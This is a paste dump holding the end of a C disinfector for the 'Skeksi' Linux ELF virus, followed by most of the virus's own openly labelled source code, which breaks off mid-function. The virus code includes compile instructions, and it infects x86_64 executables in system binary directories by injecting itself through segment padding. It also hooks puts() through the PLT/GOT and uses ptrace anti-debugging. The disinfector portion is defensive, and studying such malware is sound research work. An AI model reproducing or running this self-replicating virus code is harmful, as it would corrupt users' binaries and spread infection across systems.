			if (!(addr >= plt_addr && addr < plt_addr + plt_size)) {
				for (c = 0, j = 0; j < plt_size; j += 16, c++) {
					if (c == symindex) {
						printf(""Successfully disinfected PLT/GOT table\n"");
						*(uint32_t *)gotptr = plt_addr + j + 6;
						return 0;
					}	
				}	

			}
			printf(""Failed to disinfect PLT/GOT table\n"");
			return -1;
		}
	}
	
	return 0;
}

/*
 * Expected x86_64 base is 0x400000 in Linux. We rely on that
 * here, which may end up being a bit wobbly.
 */
int disinfect(elfdesc_t *elf)
{
	size_t paddingSize;
	Elf64_Phdr *phdr = elf->phdr;
	Elf64_Shdr *shdr = elf->shdr;
	uint32_t text_offset = 0;
	char *strtab = NULL;
	uint8_t *mem = elf->mem;
	int i, textfound, fd;
	ssize_t c, last_chunk;
	if (elf->textVaddr >= 0x400000) {
		printf(""unexpected text segment address, this file may not actually be infected\n"");
		return -1;
	}

	paddingSize = 0x400000 - elf->textVaddr;
	
	/*
	 * Remove PLT/GOT hooks if present
	 */
	int ret = disinfect_pltgot(elf);
	
	/*
	 * Remove infection magic
	 */
	*(uint32_t *)&elf->ehdr->e_ident[EI_PAD] = 0x00000000;

	/*
	 * PT_PHDR, PT_INTERP were pushed forward in the file
	 */
	phdr[0].p_offset -= paddingSize;
	phdr[1].p_offset -= paddingSize;
	
	/*
	 * Set phdr's back to normal
	 */
	for (textfound = 0, i = 0; i < elf->ehdr->e_phnum; i++) {
		if (textfound) {
			phdr[i].p_offset -= paddingSize;
			continue;
		}
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0 && phdr[i].p_flags & PF_X) {
			if (phdr[i].p_paddr == phdr[i].p_vaddr) {
				phdr[i].p_vaddr += paddingSize;
				phdr[i].p_paddr += paddingSize;
			} else
				phdr[i].p_vaddr += paddingSize;
			/*
			 * reset segment size for text
			 */
			phdr[i].p_filesz -= paddingSize;
			phdr[i].p_memsz -= paddingSize;
			phdr[i].p_align = 0x200000;
			phdr[i + 1].p_align = 0x200000;
			textfound = 1;
		}
	}
	
	text_offset = locate_glibc_init_offset(elf);

	/*
	 * Straighten out section headers
	 */
	strtab = (char *)&mem[shdr[elf->ehdr->e_shstrndx].sh_offset];
	for (i = 0; i < elf->ehdr->e_shnum; i++) {
		/*
	 	 * We treat .text section special because it is modified to 
		 * encase the entire parasite code. Lets change it back to 
		 * only encasing the regular .text stuff.
		 */
		if (!strcmp(&strtab[shdr[i].sh_name], "".text"")) {
			if (text_offset == 0) // leave unchanged :(
				continue;
			shdr[i].sh_offset = text_offset - paddingSize;
			shdr[i].sh_addr = (text_offset - paddingSize) + 0x400000;
			continue;
		}
		shdr[i].sh_offset -= paddingSize;
	}
	
	/*
	 * Set phdr and shdr table back
	 */
	elf->ehdr->e_shoff -= paddingSize;
	elf->ehdr->e_phoff -= paddingSize;
           
	/*
	 * Set original entry point
	 */
	elf->ehdr->e_entry = 0x400000 + text_offset;
      	elf->ehdr->e_entry -= paddingSize;

	if ((fd = open(TMP, O_CREAT | O_TRUNC | O_WRONLY, elf->st.st_mode)) < 0) 
		return -1;

	if ((c = write(fd, mem, sizeof(Elf64_Ehdr))) != sizeof(Elf64_Ehdr)) 
		return -1;

	mem += paddingSize + sizeof(Elf64_Ehdr);
	last_chunk = elf->st.st_size - (paddingSize + sizeof(Elf64_Ehdr));
	
	if ((c = write(fd, mem, last_chunk)) != last_chunk) 
		return -1;

	if (fchown(fd, elf->st.st_uid, elf->st.st_gid) < 0)
		return -1;

	rename(TMP, elf->path);
	
	return 0;
}

int load_executable(const char *path, elfdesc_t *elf)
{
	uint8_t *mem;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	int fd;
	struct stat st;
	int i;

	if ((fd = open(path, O_RDONLY)) < 0) {
		perror(""open"");
		return -1;
	}
	fstat(fd, &st);
	
	mem = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (mem == MAP_FAILED) {
		perror(""mmap"");
		return -1;
	}
	
	ehdr = (Elf64_Ehdr *)mem;
	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
	
	elf->st = st;
	
	for (i = 0; i < ehdr->e_phnum; i++) {
		switch(!!phdr[i].p_offset) {
			case 0:
				elf->textVaddr = phdr[i].p_vaddr;
				elf->textSize = phdr[i].p_filesz;
				break;
			case 1:
				elf->dataOff = phdr[i].p_offset;
				elf->dataVaddr = phdr[i].p_vaddr;
				elf->dataSize = phdr[i].p_filesz;
				break;
		}
	}
	elf->mem = mem;
	elf->ehdr = ehdr;
	elf->phdr = phdr;
	elf->shdr = shdr;
	elf->path = (char *)path;
	return 0;
	
}
	
int test_for_skeksi(elfdesc_t *elf)
{
	uint32_t magic = *(uint32_t *)&elf->ehdr->e_ident[EI_PAD];
	return (magic == 0x15D25); 
}

int main(int argc, char **argv)
{
	elfdesc_t elf;

	if (argc < 2) {
		printf(""Usage: %s <executable>\n"", argv[0]);
		exit(0);
	}
	
	if (load_executable(argv[1], &elf) < 0) {
		printf(""Failed to load executable: %s\n"", argv[1]);
		exit(-1);
	}
	
	if (test_for_skeksi(&elf) == 0) {
		printf(""File: %s, is not infected with the Skeksi virus\n"", argv[1]);
		exit(-1);
	}
	printf(""File: %s, is infected with the skeksi virus! Attempting to disinfect\n"", argv[1]);

	if (disinfect(&elf) < 0) {
		printf(""Failed to disinfect file: %s\n"", argv[1]);
		exit(-1);
	}

	printf(""Successfully disinfected: %s\n"", argv[1]);
	
	
}
"
X12iCsDG,skesi_virus - a Linux X86_64 ELF Virus,FlyFar,C,Sunday 18th of June 2023 10:21:03 AM CDT,"/*
 * Skeksi Virus v0.1 - infects files that are ELF_X86_64 Linux ET_EXEC's
 * Written by ElfMaster - ryan@bitlackeys.org
 *
 * Compile:
 * gcc -g -O0 -DANTIDEBUG -DINFECT_PLTGOT  -fno-stack-protector -c virus.c -fpic -o virus.o
 * gcc -N -fno-stack-protector -nostdlib virus.o -o virus
 *
 * Using -DDEBUG will allow Virus to print debug output
 *
 * Usage:
 * ./virus
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <elf.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <link.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <time.h>
#include <signal.h>
#include <sys/user.h>
#include <sys/prctl.h>
#include <sys/time.h>

#define VIRUS_LAUNCHER_NAME ""virus""

struct linux_dirent64 {
        uint64_t             d_ino;
        int64_t             d_off;
        unsigned short  d_reclen;
        unsigned char   d_type;
        char            d_name[0];
} __attribute__((packed));

	

/* libc */ 

void Memset(void *mem, unsigned char byte, unsigned int len);
void _memcpy(void *, void *, unsigned int);
int _printf(char *, ...);
char * itoa(long, char *);
char * itox(long, char *);
int _puts(char *);
int _puts_nl(char *);
size_t _strlen(char *);
char *_strchr(const char *, int);
char * _strrchr(const char *, int);
int _strncmp(const char *, const char *, size_t);
int _strcmp(const char *, const char *);
int _memcmp(const void *, const void *, unsigned int);
char _toupper(char c);


/* syscalls */
long _ptrace(long request, long pid, void *addr, void *data);
int _prctl(long option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
int _fstat(long, void *);
int _mprotect(void * addr, unsigned long len, int prot);
long _lseek(long, long, unsigned int);
void Exit(long);
void *_mmap(void *, unsigned long, unsigned long, unsigned long,  long, unsigned long);
int _munmap(void *, size_t);
long _open(const char *, unsigned long, long);
long _write(long, char *, unsigned long);
int _read(long, char *, unsigned long);
int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                    unsigned int count);
int _rename(const char *, const char *);
int _close(unsigned int);
int _gettimeofday(struct timeval *, struct timezone *);

/* Customs */
unsigned long get_rip(void);
void end_code(void);
void dummy_marker(void);
static inline uint32_t get_random_number(int) __attribute__((__always_inline__));
void display_skeksi(void);

#define PIC_RESOLVE_ADDR(target) (get_rip() - ((char *)&get_rip_label - (char *)target))

#if defined(DEBUG) && DEBUG > 0
 #define DEBUG_PRINT(fmt, args...) _printf(""DEBUG: %s:%d:%s(): "" fmt, \
    __FILE__, __LINE__, __func__, ##args)
#else
 #define DEBUG_PRINT(fmt, args...) /* Don't do anything in release builds */
#endif

#define PAGE_ALIGN(x) (x & ~(PAGE_SIZE - 1))
#define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE) 
#define PAGE_ROUND(x) (PAGE_ALIGN_UP(x))
#define STACK_SIZE 0x4000000

#define TMP "".xyz.skeksi.elf64""
#define RODATA_PADDING 17000 // enough bytes to also copy .rodata and skeksi_banner

#define LUCKY_NUMBER 7
#define MAGIC_NUMBER 0x15D25 //thankz Mr. h0ffman

#define __ASM__ asm __volatile__

extern long real_start;
extern long get_rip_label;

struct bootstrap_data {
	int argc;
	char **argv;
};

typedef struct elfbin {
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	Elf64_Dyn *dyn;
	Elf64_Addr textVaddr;
	Elf64_Addr dataVaddr;
	size_t textSize;
	size_t dataSize;
	Elf64_Off dataOff;
	Elf64_Off textOff;
	uint8_t *mem;
	size_t size;
	char *path;
	struct stat st;
	int fd;
	int original_virus_exe;
} elfbin_t;

#define DIR_COUNT 4

_start()
{
#if 0
	struct bootstrap_data bootstrap;
#endif
	/*
	 * Save register state before executing parasite
	 * code.
	 */
	__ASM__ (
	 "".globl real_start	\n""
 	 ""real_start:		\n""
	 ""push %rsp	\n""
	 ""push %rbp	\n""
	 ""push %rax	\n""
	 ""push %rbx	\n""
	 ""push %rcx	\n""
	 ""push %rdx	\n""
	 ""push %r8	\n""
	 ""push %r9	\n""
	 ""push %r10	\n""
	 ""push %r11	\n""
	 ""push %r12	\n""
	 ""push %r13	\n""
	 ""push %r14	\n""
	 ""push %r15	  "");
	
#if 0
	__ASM__ (""mov 0x08(%%rbp), %%rcx "" : ""=c"" (bootstrap.argc));
        __ASM__ (""lea 0x10(%%rbp), %%rcx "" : ""=c"" (bootstrap.argv));
#endif
	/*
	 * Load bootstrap pointer as argument to do_main()
	 * and call it.
	 */
	__ASM__ ( 
#if 0
	 ""leaq %0, %%rdi\n""
#endif
	 ""call do_main   "" //:: ""g""(bootstrap)
	);
	/*
	 * Restore register state
	 */
	__ASM__ (
	 ""pop %r15	\n""
	 ""pop %r14	\n""
	 ""pop %r13	\n""
	 ""pop %r12	\n""
	 ""pop %r11	\n""
	 ""pop %r10	\n""
	 ""pop %r9	\n""
	 ""pop %r8	\n""
	 ""pop %rdx	\n""
	 ""pop %rcx	\n""
	 ""pop %rbx	\n""
	 ""pop %rax	\n""
	 ""pop %rbp	\n""
	 ""pop %rsp	\n""	
	 ""add $0x8, %rsp\n""
	 ""jmp end_code	"" 
	);
}

/*
 * l33t sp34k version of puts. We infect PLTGOT
 * entry for puts() of infected binaries.
 */

int evil_puts(const char *string)
{
	char *s = (char *)string;
	char new[1024];
	int index = 0;
	int rnum = get_random_number(5);
	if (rnum != 3)
		goto normal;

	Memset(new, 0, 1024);
	while (*s != '\0' && index < 1024) {
		switch(_toupper(*s)) {
			case 'I':
				new[index++] = '1';
				break;
			case 'E':
				new[index++] = '3';
				break;
			case 'S':
				new[index++] = '5';
				break;
			case 'T':
				new[index++] = '7';
				break;
			case 'O':
				new[index++] = '0';
				break;	
			case 'A':
				new[index++] = '4';
				break;
			default:
				new[index++] = *s;
				break;
		}
		s++;
	}
	return _puts_nl(new);
normal:
	return _puts_nl((char *)string);
}

/*
 * Heap areas are created by passing a NULL initialized
 * pointer by reference.
 */
#define CHUNK_SIZE 256
void * vx_malloc(size_t len, uint8_t **mem)
{
	if (*mem == NULL) {
		*mem = _mmap(NULL, 0x200000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
		if (*mem == MAP_FAILED) {
			DEBUG_PRINT(""malloc failed with mmap\n"");
			Exit(-1);
		}
	}
	*mem += CHUNK_SIZE;
	return (void *)((char *)*mem - len);
}

static inline void vx_free(uint8_t *mem)
{
	uintptr_t addr = (uintptr_t)mem;
	if ((addr & 0x000000000fff) == 0) {
		_munmap(mem, 0x200000);
		return;
	}
	addr -= CHUNK_SIZE;
	mem = (uint8_t *)addr;
}

static inline int _rand(long *seed) // RAND_MAX assumed to be 32767
{
        *seed = *seed * 1103515245 + 12345;
        return (unsigned int)(*seed / 65536) & 32767;
}
/*
 * We rely on ASLR to get our psuedo randomness, since RSP will be different
 * at each execution.
 */
static inline uint32_t get_random_number(int max)
{
	struct timeval tv;
	_gettimeofday(&tv, NULL);
	return _rand(&tv.tv_usec) % max;
}
	
static inline char * randomly_select_dir(char **dirs) 
{	
	return (char *)dirs[get_random_number(DIR_COUNT)];
}

char * full_path(char *exe, char *dir, uint8_t **heap)
{
	char *ptr = (char *)vx_malloc(_strlen(exe) + _strlen(dir) + 2, heap);
	Memset(ptr, 0, _strlen(exe) + _strlen(dir));
	_memcpy(ptr, dir, _strlen(dir));
	ptr[_strlen(dir)] = '/';
	if (*exe == '.' && *(exe + 1) == '/')
		exe += 2;
	_memcpy(&ptr[_strlen(dir) + 1], exe, _strlen(exe));
	return ptr;
}
	
#define JMPCODE_LEN 6

int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t *self, ElfW(Addr) orig_entry_point)
{
	int ofd;
	unsigned int c;
	int i, t = 0, ehdr_size = sizeof(ElfW(Ehdr));
	unsigned char *mem = target->mem;
	unsigned char *parasite = self->mem;
	char *host = target->path, *protected; 
	struct stat st;

	_memcpy((struct stat *)&st, (struct stat *)&target->st, sizeof(struct stat));

        /* eot is: 
         * end_of_text = e_hdr->e_phoff + nc * e_hdr->e_phentsize;
         * end_of_text += p_hdr->p_filesz;
         */ 
        extern int return_entry_start;

        if ((ofd = _open(TMP, O_CREAT|O_WRONLY|O_TRUNC, st.st_mode)) == -1) 
                return -1;
        
        /*
         * Write first 64 bytes of original binary (The elf file header) 
         * [ehdr] 
         */
        if ((c = _write(ofd, mem, ehdr_size)) != ehdr_size) 
		return -1;
        
        /*
         * Now inject the virus
         * [ehdr][virus]
         */
	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
        void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
	int end_code_size = (int)((char *)f2 - (char *)f1);
 	Elf64_Addr end_code_addr = PIC_RESOLVE_ADDR(&end_code);
        uint8_t jmp_patch[6] = {0x68, 0x0, 0x0, 0x0, 0x0, 0xc3};
	*(uint32_t *)&jmp_patch[1] = orig_entry_point;
	/*
	 * Write parasite up until end_code()
	 */
	size_t initial_parasite_len = self->size - RODATA_PADDING;
	initial_parasite_len -= end_code_size;
        
	if ((c = _write(ofd, parasite, initial_parasite_len)) != initial_parasite_len) {
		return -1;
	}
	_write(ofd, jmp_patch, sizeof(jmp_patch));
	_write(ofd, &parasite[initial_parasite_len + sizeof(jmp_patch)], RODATA_PADDING + (end_code_size - sizeof(jmp_patch)));
  
	/*
         * Seek to end of tracer.o + PAGE boundary  
         * [ehdr][virus][pad]
         */
        uint32_t offset = sizeof(ElfW(Ehdr)) + paddingSize;
        if ((c = _lseek(ofd, offset, SEEK_SET)) != offset) 
		return -1;
        
        /*
         * Write the rest of the original binary
         * [ehdr][virus][pad][phdrs][text][data][shdrs]
         */
        mem += sizeof(Elf64_Ehdr);
        
        unsigned int final_length = st.st_size - (sizeof(ElfW(Ehdr))); // + target->ehdr->e_shnum * sizeof(Elf64_Shdr));
        if ((c = _write(ofd, mem, final_length)) != final_length) 
		return -1;

	_close(ofd);

	return 0;
}

Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	uint8_t *mem;
	int fd;
	int text_found = 0, i;
        Elf64_Addr orig_entry_point;
        Elf64_Addr origText;
	Elf64_Addr new_base;
	size_t parasiteSize;
	size_t paddingSize;
	struct stat st;
	char *host = target->path;
	long o_entry_offset;
	/*
	 * Get size of parasite (self)
	 */
        parasiteSize = self->size;
	paddingSize = PAGE_ALIGN_UP(parasiteSize);
	
	mem = target->mem;
	*(uint32_t *)&mem[EI_PAD] = MAGIC_NUMBER;
	ehdr = (Elf64_Ehdr *)target->ehdr;
	phdr = (Elf64_Phdr *)target->phdr;
	shdr = (Elf64_Shdr *)target->shdr;
	orig_entry_point = ehdr->e_entry;
	
	phdr[0].p_offset += paddingSize;
        phdr[1].p_offset += paddingSize;
        
        for (i = 0; i < ehdr->e_phnum; i++) {
                if (text_found)
                        phdr[i].p_offset += paddingSize;
        
                if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R|PF_X)) {
                                origText = phdr[i].p_vaddr;
                                phdr[i].p_vaddr -= paddingSize;
				phdr[i].p_paddr -= paddingSize;
                                phdr[i].p_filesz += paddingSize;
                                phdr[i].p_memsz += paddingSize;
				phdr[i].p_align = 0x1000; // this will allow infected bins to work with PaX :)
				new_base = phdr[i].p_vaddr;
				text_found = 1;
                } else {
			if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset && (phdr[i].p_flags & PF_W))
				phdr[i].p_align = 0x1000; // also to  allow infected bins to work with PaX :)
		}
		
        }
        if (!text_found) {
                DEBUG_PRINT(""Error, unable to locate text segment in target executable: %s\n"", target->path);
                return -1;
        }
	ehdr->e_entry = origText - paddingSize + sizeof(ElfW(Ehdr));
	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
	char *StringTable = &mem[shdr[ehdr->e_shstrndx].sh_offset];
	for (i = 0; i < ehdr->e_shnum; i++) {
	/*
	 * This makes the Virus strip safe, as it will be contained within a section now.
	 * It also makes it so that the e_entry still points into the .text section which
	 * may set off less heuristics.
	 */
                if (!_strncmp((char *)&StringTable[shdr[i].sh_name], "".text"", 5)) {
                        shdr[i].sh_offset = sizeof(ElfW(Ehdr)); // -= (uint32_t)paddingSize;
			shdr[i].sh_addr = origText - paddingSize;
			shdr[i].sh_addr += sizeof(ElfW(Ehdr));
                        shdr[i].sh_size += self->size;
                }  
                else 
			shdr[i].sh_offset += paddingSize;

	}
	ehdr->e_shoff += paddingSize;
	ehdr->e_phoff += paddingSize;
	
	inject_parasite(parasiteSize, paddingSize, target, self, orig_entry_point);
	
	return new_base;
}
/*
 * Since our parasite exists of both a text and data segment
 * we include the initial ELF file header and phdr in each parasite
 * insertion. This lends itself well to being able to self-load by
 * parsing our own program headers etc.
 */
int load_self(elfbin_t *elf)
{	
	int i;
	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
	void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
	Elf64_Addr _start_addr = PIC_RESOLVE_ADDR(&_start);
	elf->mem = (uint8_t *)_start_addr;
	elf->size = (char *)&end_code - (char *)&_start; 
	elf->size += (int)((char *)f2 - (char *)f1);
	//elf->size += 1024; // So we have .rodata included in parasite insertion
	elf->size += RODATA_PADDING; //SKEKSI_BYTECODE_SIZE;
	return 0;
}

void unload_target(elfbin_t *elf)
{
	_munmap(elf->mem, elf->size);
	_close(elf->fd);
}

int load_target(const char *path, elfbin_t *elf)
{
	int i;
	struct stat st;
	elf->path = (char *)path;
	int fd = _open(path, O_RDONLY, 0);
	if (fd < 0)
		return -1;
	elf->fd = fd;
	if (_fstat(fd, &st) < 0)
		return -1;
	elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (elf->mem == MAP_FAILED)
		return -1;
	elf->ehdr = (Elf64_Ehdr *)elf->mem;
	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
	elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
	for (i = 0; i < elf->ehdr->e_phnum; i++) {
		switch(elf->phdr[i].p_type) {	
			case PT_LOAD:
				switch(!!elf->phdr[i].p_offset) {
                        	case 0:
                                	elf->textVaddr = elf->phdr[i].p_vaddr;
                                	elf->textSize = elf->phdr[i].p_memsz;
                                	break;
                               	case 1:
                                	elf->dataVaddr = elf->phdr[i].p_vaddr;
                                	elf->dataSize = elf->phdr[i].p_memsz;
                                	elf->dataOff = elf->phdr[i].p_offset;
					break;
                        }
				break;
			case PT_DYNAMIC:
				elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset];
				break;
		}
			
        }
	elf->st = st;
	elf->size = st.st_size;
	return 0;
}

int load_target_writeable(const char *path, elfbin_t *elf)
{
        int i;
        struct stat st;
        elf->path = (char *)path;
        int fd = _open(path, O_RDWR, 0);
        if (fd < 0)
                return -1;
        elf->fd = fd;
        if (_fstat(fd, &st) < 0)
                return -1;
        elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
        if (elf->mem == MAP_FAILED)
                return -1;
        elf->ehdr = (Elf64_Ehdr *)elf->mem;
        elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
        elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
        for (i = 0; i < elf->ehdr->e_phnum; i++) {
                switch(elf->phdr[i].p_type) {
                        case PT_LOAD:
                                switch(!!elf->phdr[i].p_offset) {
                                case 0:
                                        elf->textVaddr = elf->phdr[i].p_vaddr;
                                        elf->textSize = elf->phdr[i].p_memsz;
                                        break;
                                case 1:
                                        elf->dataVaddr = elf->phdr[i].p_vaddr;
                                        elf->dataSize = elf->phdr[i].p_memsz;
                                        elf->dataOff = elf->phdr[i].p_offset;
                                        break;
                        }
                                break;
                        case PT_DYNAMIC:
                                elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset];
                                break;
                }

        }
        elf->st = st;
        elf->size = st.st_size;
        return 0;
}
/* 
 * We hook puts() for l33t sp34k 0utput. We parse the phdr's dynamic segment
 * directly so we can still infect programs that are stripped of section header
 * tables.
 */
int infect_pltgot(elfbin_t *target, Elf64_Addr new_fn_addr)
{
	int i, j = 0, symindex = -1;	
	Elf64_Sym *symtab;
	Elf64_Rela *jmprel;
	Elf64_Dyn *dyn = target->dyn;
	Elf64_Addr *gotentry, *pltgot;
	char *strtab;
	size_t strtab_size;
	size_t jmprel_size;
	Elf64_Addr gotaddr = 0; // INITIALIZE!
	Elf64_Off gotoff = 0;
	
	for (i = 0; dyn[i].d_tag != DT_NULL; i++) {
		switch(dyn[i].d_tag) {
			case DT_SYMTAB: // relative to the text segment base
				symtab = (Elf64_Sym *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];			
				break;
			case DT_PLTGOT: // relative to the data segment base
				pltgot = (long *)&target->mem[target->dataOff + (dyn[i].d_un.d_ptr - target->dataVaddr)];
				break;
			case DT_STRTAB: // relative to the text segment base
				strtab = (char *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
				break;
			case DT_STRSZ:
				strtab_size = (size_t)dyn[i].d_un.d_val;
				break;
			case DT_JMPREL:
				jmprel = (Elf64_Rela *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
				break;
			case DT_PLTRELSZ:
				jmprel_size = (size_t)dyn[i].d_un.d_val;
				break;
	
		}
	}
	if (symtab == NULL || pltgot == NULL) {
		DEBUG_PRINT(""Unable to locate symtab or pltgot\n"");
		return -1;
	}
	
	for (i = 0; symtab[i].st_name <= strtab_size; i++) {
		if (!_strcmp(&strtab[symtab[i].st_name], ""puts"")) {
			DEBUG_PRINT(""puts symbol index: %d\n"", i);
			symindex = i;
			break;
		}	
	}
	if (symindex == -1) {
		DEBUG_PRINT(""cannot find puts()\n"");
		return -1;
	}
	for (i = 0; i < jmprel_size / sizeof(Elf64_Rela); i++) {
		if (!_strcmp(&strtab[symtab[ELF64_R_SYM(jmprel[i].r_info)].st_name], ""puts"")) {
			gotaddr = jmprel[i].r_offset;
			gotoff = target->dataOff + (jmprel[i].r_offset - target->dataVaddr);
			DEBUG_PRINT(""gotaddr: %x gotoff: %x\n"", gotaddr, gotoff);
			break;
		}
	}
	if (gotaddr == 0) {
		DEBUG_PRINT(""Couldn't find relocation entry for puts\n"");
		return -1;
	}
	
	gotentry = (Elf64_Addr *)&target->mem[gotoff];
	*gotentry = new_fn_addr;
	
	DEBUG_PRINT(""patched GOT entry %x with address %x\n"", gotaddr, new_fn_addr);
	return 0;
	
}
/*
 * Must be ELF
 * Must be ET_EXEC
 * Must be dynamically linked
 * Must not yet be infected
 */
int check_criteria(char *filename)
{
	int fd, dynamic, i, ret = 0;
	struct stat st;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	uint8_t mem[4096];
	uint32_t magic;
	
	fd = _open(filename, O_RDONLY, 0);
	if (fd < 0) 
		return -1;
	if (_read(fd, mem, 4096) < 0)
		return -1;
	_close(fd);
	ehdr = (Elf64_Ehdr *)mem;
	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
	if(_memcmp(""\x7f\x45\x4c\x46"", mem, 4) != 0) 
		return -1;
	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
	if (magic == MAGIC_NUMBER)  //already infected? Then skip this file
		return -1;
	if (ehdr->e_type != ET_EXEC) 
		return -1;
	if (ehdr->e_machine != EM_X86_64) 
		return -1;
	for (dynamic = 0, i = 0; i < ehdr->e_phnum; i++) 
		if (phdr[i].p_type == PT_DYNAMIC)	
			dynamic++;
	if (!dynamic) 
		return -1;
	return 0;

}

void do_main(struct bootstrap_data *bootstrap)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	uint8_t *mem, *heap = NULL;
	long new_base, base_addr, evilputs_addr, evilputs_offset;
	struct linux_dirent64 *d;
	int bpos, fcount, dd, nread;
	char *dir = NULL, **files, *fpath, dbuf[32768];
	struct stat st;
	mode_t mode;
	uint32_t rnum;
	elfbin_t self, target;
	int scan_count = DIR_COUNT;
	int icount = 0;
	int paddingSize;
	/*
	 * NOTE: 
	 * we can't use string literals because they will be
	 * stored in either .rodata or .data sections.
	 */
	char *dirs[4] = {""/sbin"", ""/usr/sbin"", ""/bin"", ""/usr/bin"" };
	char cwd[2] = {'.', '\0'};

#if ANTIDEBUG
        if (_ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
                _printf(""!! Skeksi Virus, 2015 !!\n"");
                Exit(-1);
        }
        _prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
#endif

rescan:
	dir = _getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
	if (!_strcmp(dir, "".""))
		scan_count = 1;
	DEBUG_PRINT(""Infecting files in directory: %s\n"", dir);
	
	dd = _open(dir, O_RDONLY | O_DIRECTORY, 0);
	if (dd < 0) {
		DEBUG_PRINT(""open failed\n"");
		return;
	}
	
	load_self(&self);
	
	for (;;) {
		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 32768);
		if (nread < 0) {
			DEBUG_PRINT(""getdents64 failed\n"");
			return;
		}
		if (nread == 0)
			break;
		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
			d = (struct linux_dirent64 *) (dbuf + bpos);
    			bpos += d->d_reclen - 1;
			if (!_strcmp(d->d_name, VIRUS_LAUNCHER_NAME)) 
				continue;
			if (d->d_name[0] == '.')
				continue;
			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
				continue; 
			if (icount == 0)
				goto infect;
			rnum = get_random_number(10);
                        if (rnum != LUCKY_NUMBER)
                                continue;
infect:
			load_target(fpath, &target);
			new_base = infect_elf_file(&self, &target);
			unload_target(&target);
#ifdef INFECT_PLTGOT
			load_target_writeable(TMP, &target);
			base_addr = PIC_RESOLVE_ADDR(&_start);
			evilputs_addr = PIC_RESOLVE_ADDR(&evil_puts);
			evilputs_offset = evilputs_addr - base_addr;
			infect_pltgot(&target, new_base + evilputs_offset + sizeof(Elf64_Ehdr));
			unload_target(&target);
#endif

			_rename(TMP, fpath);
			icount++;
		}
		
	}
	if (--scan_count > 0) {
		_close(dd);
		goto rescan;
	}

	rnum = get_random_number(50);
	if (rnum == LUCKY_NUMBER) 
		display_skeksi();
	
}

int _getuid(void)
{
        unsigned long ret;
        __asm__ volatile(""mov $102, %rax\n""
                         ""syscall"");
         asm (""mov %%rax, %0"" : ""=r""(ret));
        return (int)ret;
}

void Exit(long status)
{
        __asm__ volatile(""mov %0, %%rdi\n""
                         ""mov $60, %%rax\n""
                         ""syscall"" : : ""r""(status));
}

long _open(const char *path, unsigned long flags, long mode)
{
        long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov %1, %%rsi\n""
			""mov %2, %%rdx\n""
                        ""mov $2, %%rax\n""
                        ""syscall"" : : ""g""(path), ""g""(flags), ""g""(mode));
        asm (""mov %%rax, %0"" : ""=r""(ret));              
        
        return ret;
}

int _close(unsigned int fd)
{
        long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov $3, %%rax\n""
                        ""syscall"" : : ""g""(fd));
        return (int)ret;
}

int _read(long fd, char *buf, unsigned long len)
{
         long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov %1, %%rsi\n""
                        ""mov %2, %%rdx\n""
                        ""mov $0, %%rax\n""
                        ""syscall"" : : ""g""(fd), ""g""(buf), ""g""(len));
        asm(""mov %%rax, %0"" : ""=r""(ret));
        return (int)ret;
}

long _write(long fd, char *buf, unsigned long len)
{
        long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov %1, %%rsi\n""
                        ""mov %2, %%rdx\n""
                        ""mov $1, %%rax\n""
